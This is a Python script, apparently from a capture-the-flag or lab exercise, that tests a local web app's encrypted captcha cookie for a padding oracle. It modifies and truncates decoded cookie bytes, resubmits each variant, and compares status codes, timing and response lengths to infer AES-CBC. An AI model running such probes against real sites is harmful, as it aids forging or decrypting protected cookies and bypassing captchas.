import requests
import base64
import time
from urllib.parse import quote, unquote

TARGET_URL = "http://127.0.0.1:32869/"

def get_fresh_captcha():
    """Get a fresh captcha cookie from the server"""
    response = requests.get(TARGET_URL)
    captcha_cookie = response.cookies.get('captcha')
    return captcha_cookie

def test_captcha_manipulation(captcha_value, description):
    """Test a specific captcha cookie manipulation"""
    cookies = {'captcha': captcha_value}
    
    start_time = time.time()
    try:
        response = requests.post(
            TARGET_URL,
            data={'captcha_text': 'WRONG'},
            cookies=cookies,
            timeout=10
        )
        elapsed_time = time.time() - start_time
        
        return {
            'description': description,
            'status_code': response.status_code,
            'response_time': f"{elapsed_time:.4f}s",
            'content_length': len(response.content),
            'error_in_response': 'error' in response.text.lower() or 'invalid' in response.text.lower(),
            'response_snippet': response.text[:200].replace('\n', ' ')
        }
    except Exception as e:
        elapsed_time = time.time() - start_time
        return {
            'description': description,
            'status_code': 'ERROR',
            'response_time': f"{elapsed_time:.4f}s",
            'content_length': 0,
            'error_in_response': True,
            'response_snippet': str(e)[:200]
        }

# Get fresh captcha cookie
print("[*] Getting fresh captcha cookie...")
original_captcha = get_fresh_captcha()
print(f"[+] Original captcha cookie: {original_captcha}")
print(f"[+] Length: {len(original_captcha)} characters")
print()

# Decode to manipulate bytes
try:
    decoded = base64.b64decode(original_captcha)
    print(f"[+] Decoded length: {len(decoded)} bytes")
    print(f"[+] Decoded hex: {decoded.hex()}")
    print()
except Exception as e:
    print(f"[-] Failed to decode: {e}")
    decoded = None

# Test cases
test_results = []

# Test 1: Original cookie with wrong captcha
print("[*] Test 1: Original cookie with wrong captcha text")
result = test_captcha_manipulation(original_captcha, "Original (baseline)")
test_results.append(result)

if decoded:
    # Test 2: Last byte +1
    print("[*] Test 2: Last byte modified by +1")
    modified = bytearray(decoded)
    modified[-1] = (modified[-1] + 1) % 256
    encoded = base64.b64encode(bytes(modified)).decode()
    result = test_captcha_manipulation(encoded, "Last byte +1")
    test_results.append(result)
    
    # Test 3: Last byte +2
    print("[*] Test 3: Last byte modified by +2")
    modified = bytearray(decoded)
    modified[-1] = (modified[-1] + 2) % 256
    encoded = base64.b64encode(bytes(modified)).decode()
    result = test_captcha_manipulation(encoded, "Last byte +2")
    test_results.append(result)
    
    # Test 4: Last byte set to 0x00
    print("[*] Test 4: Last byte set to 0x00")
    modified = bytearray(decoded)
    modified[-1] = 0x00
    encoded = base64.b64encode(bytes(modified)).decode()
    result = test_captcha_manipulation(encoded, "Last byte = 0x00")
    test_results.append(result)
    
    # Test 5: Last byte set to 0xFF
    print("[*] Test 5: Last byte set to 0xFF")
    modified = bytearray(decoded)
    modified[-1] = 0xFF
    encoded = base64.b64encode(bytes(modified)).decode()
    result = test_captcha_manipulation(encoded, "Last byte = 0xFF")
    test_results.append(result)
    
    # Test 6: Truncated by 1 byte
    print("[*] Test 6: Cookie truncated by 1 byte")
    truncated = decoded[:-1]
    encoded = base64.b64encode(truncated).decode()
    result = test_captcha_manipulation(encoded, "Truncated -1 byte")
    test_results.append(result)
    
    # Test 7: Second-to-last byte modified
    print("[*] Test 7: Second-to-last byte modified by +1")
    modified = bytearray(decoded)
    if len(modified) > 1:
        modified[-2] = (modified[-2] + 1) % 256
        encoded = base64.b64encode(bytes(modified)).decode()
        result = test_captcha_manipulation(encoded, "2nd-last byte +1")
        test_results.append(result)
    
    # Test 8: First byte modified
    print("[*] Test 8: First byte modified by +1")
    modified = bytearray(decoded)
    modified[0] = (modified[0] + 1) % 256
    encoded = base64.b64encode(bytes(modified)).decode()
    result = test_captcha_manipulation(encoded, "First byte +1")
    test_results.append(result)
    
    # Test 9: Random corruption
    print("[*] Test 9: Middle byte modified")
    modified = bytearray(decoded)
    if len(modified) > 2:
        mid_idx = len(modified) // 2
        modified[mid_idx] = (modified[mid_idx] + 1) % 256
        encoded = base64.b64encode(bytes(modified)).decode()
        result = test_captcha_manipulation(encoded, "Middle byte +1")
        test_results.append(result)

print("\n" + "="*120)
print("PADDING ORACLE TEST RESULTS")
print("="*120)
print(f"{'Description':<20} {'Status':<8} {'Time':<12} {'Length':<8} {'Error?':<8} {'Response Snippet'}")
print("-"*120)

baseline_time = None
for i, result in enumerate(test_results):
    if i == 0:
        # Extract baseline timing
        try:
            baseline_time = float(result['response_time'].rstrip('s'))
        except:
            pass
    
    timing_diff = ""
    if baseline_time and i > 0:
        try:
            current_time = float(result['response_time'].rstrip('s'))
            diff = current_time - baseline_time
            if abs(diff) > 0.01:  # More than 10ms difference
                timing_diff = f" (Δ{diff:+.4f}s)"
        except:
            pass
    
    print(f"{result['description']:<20} "
          f"{str(result['status_code']):<8} "
          f"{result['response_time']:<12}{timing_diff:<15} "
          f"{result['content_length']:<8} "
          f"{str(result['error_in_response']):<8} "
          f"{result['response_snippet'][:50]}")

print("="*120)

# Analysis
print("\n[*] ANALYSIS:")
statuses = set(r['status_code'] for r in test_results)
times = [float(r['response_time'].rstrip('s')) for r in test_results if r['response_time'] != 'ERROR']
lengths = set(r['content_length'] for r in test_results)

print(f"[+] Unique status codes: {statuses}")
print(f"[+] Response time range: {min(times):.4f}s - {max(times):.4f}s (variance: {max(times)-min(times):.4f}s)")
print(f"[+] Unique content lengths: {lengths}")

if len(statuses) > 1:
    print("[!] DIFFERENT STATUS CODES - Possible oracle indicator!")
if max(times) - min(times) > 0.05:
    print("[!] SIGNIFICANT TIMING DIFFERENCES (>50ms) - Possible timing oracle!")
if len(lengths) > 2:
    print("[!] MULTIPLE DIFFERENT RESPONSE LENGTHS - Possible oracle indicator!")

print("\n[*] Cookie structure analysis:")
if decoded:
    print(f"[+] Cookie appears to be encrypted/signed data ({len(decoded)} bytes)")
    if len(decoded) % 16 == 0:
        print(f"[!] Length is multiple of 16 - likely AES-CBC encryption!")
    elif len(decoded) % 8 == 0:
        print(f"[!] Length is multiple of 8 - possibly DES/3DES encryption")
    else:
        print(f"[+] Length is not block-aligned - possibly HMAC signature or stream cipher")

